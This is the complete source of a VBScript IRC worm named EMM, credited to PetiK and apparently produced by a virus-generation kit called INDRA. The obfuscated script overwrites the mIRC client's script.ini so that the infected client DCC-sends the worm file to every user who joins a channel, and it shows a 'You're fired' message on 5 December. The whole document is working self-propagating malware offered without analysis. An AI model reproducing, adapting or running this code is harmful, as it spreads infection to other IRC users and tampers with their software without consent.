'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
rmumytioputbrxj = WScript.ScriptFullName
Set kfukfkbrfnwmbhm = CreateObject("WScript.Shell")
Set twocgemeklwgqms = CreateObject("Scripting.FileSystemObject")
Set bphaynadjvjtsgp = twocgemeklwgqms.CreateTextFile("C:\mirc\script.ini", True)
bphaynadjvjtsgp.WriteLine "[script]"
bphaynadjvjtsgp.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
bphaynadjvjtsgp.Write "n1=/dcc  send$nick """
bphaynadjvjtsgp.Write rmumytioputbrxj
bphaynadjvjtsgp.WriteLine """ }"
bphaynadjvjtsgp.Close
If (Month(Now) = 12) and (Day(Now) = 5) Then
'Aqui va tu codigo.
MsgBox "You're fired",vbcritical,"EMM"
End If
'Generated with [INDRA] v0.4es.
